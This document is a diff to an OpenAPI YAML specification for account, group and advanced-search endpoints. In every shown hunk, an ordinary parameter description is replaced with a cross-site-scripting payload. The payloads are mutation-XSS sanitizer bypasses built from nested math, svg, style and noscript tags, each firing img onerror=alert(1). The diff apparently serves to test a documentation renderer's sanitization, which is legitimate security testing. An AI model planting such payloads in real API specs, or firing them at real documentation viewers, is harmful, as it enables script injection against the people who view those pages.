@@ -43,7 +43,7 @@ paths:
       summary: Deletes a group by id
     get:
       parameters:
-        - description: Id value to filter by
+        - description: <!--a foo=--!><img src=x onerror=alert(1)><!--<a>">
           format: int64
           in: path
           name: id
@@ -58,7 +58,7 @@ paths:
       summary: Finds groups by id
     post:
       parameters:
-        - description: Id value to filter by
+        - description: <math><p></p><style><!--</style><img src/onerror=alert(1)>--></style></math>
           in: path
           name: id
           required: true
@@ -73,7 +73,7 @@ paths:
       summary: Creates a new group by id
     put:
       parameters:
-        - description: Id value to filter by
+        - description: <svg><style><img src=x onerror=alert(1)>
           format: int64
           in: path
           name: id
@@ -90,7 +90,7 @@ paths:
   '/accounts/groupname/{name}':
     get:
       parameters:
-        - description: Name to filter by
+        - description: <noscript><style></noscript><img src=x onerror=alert(1)>
           in: path
           name: name
           required: true
@@ -106,7 +106,7 @@ paths:
   '/accounts/userid/{id}':
     delete:
       parameters:
-        - description: Id value to filter by
+        - description: <math><foo-test><mi><li><table><foo-test><li></li></foo-test><a><style><! \${</style>}<foo-b id="><img src onerror='alert(1)'>">hmm...</foo-b></a></table></li></mi></foo-test></math>
           format: int64
           in: path
           name: id
@@ -121,7 +121,7 @@ paths:
       summary: Deletes a user by id
     get:
       parameters:
-        - description: Id value to filter by
+        - description: <math><foo-test><mi><li><table><foo-test><li></li></foo-test>a<a><style><!--</style>a<foo-bar is="--><img src=x onerror=alert(1)>">
           format: int64
           in: path
           name: id
@@ -136,7 +136,7 @@ paths:
       summary: Finds users by id
     post:
       parameters:
-        - description: Id value to filter by
+        - description: <svg><a><foreignobject><a><table><a></table><style><!--</style></svg><a id="-><img src onerror=alert(1)>">
           in: path
           name: id
           required: true
@@ -151,7 +151,7 @@ paths:
       summary: Creates a new user by id
     put:
       parameters:
-        - description: Id value to filter by
+        - description: <svg><annotation-xml><foreignobject><style><!--</style><p id="--><img src='x' onerror='alert(1)'>">
           format: int64
           in: path
           name: id
@@ -168,7 +168,7 @@ paths:
   '/accounts/username/{name}':
     get:
       parameters:
-        - description: Name to filter by
+        - description: <svg><xss><desc><noscript>&lt;/noscript>&lt;/desc>&lt;p>&lt;/p>&lt;style>&lt;a title="&lt;/style>&lt;img src onerror=alert(1)>">
           in: path
           name: name
           required: true
@@ -210,7 +210,7 @@ paths:
   '/advancedcomputersearches/id/{id}':
     delete:
       parameters:
-        - description: Id value to filter by
+        - description: <form><math><mtext></form><form><mglyph><svg><mtext><style><path id="</style><img onerror=alert(1) src>">
           format: int64
           in: path
           name: id
@@ -254,7 +254,7 @@ paths:
       summary: Creates a new advanced computer search by id
     put:
       parameters:
-        - description: Id value to filter by
+        - description: <math><mtext><table><mglyph><style><math><table id=”</table>”><img src onerror=alert(1)”>
           format: int64
           in: path
           name: id
@@ -270,7 +270,7 @@ paths:
   '/advancedcomputersearches/name/{name}':
     get:
       parameters:
-        - description: Name to filter by
+        - description: <math><mtext><table><mglyph><style><math><table id=”</table>”><img src onerror=alert(1)”>
           in: path
           name: name
           required: true
@@ -295,7 +295,7 @@ paths:
   '/advancedmobiledevicesearches/id/{id}':
     delete:
       parameters:
-        - description: Id value to filter by
+        - description: <form><math><mtext></form><form><mglyph><style></math><img src onerror=alert(1)>
           format: int64
           in: path
           name: id
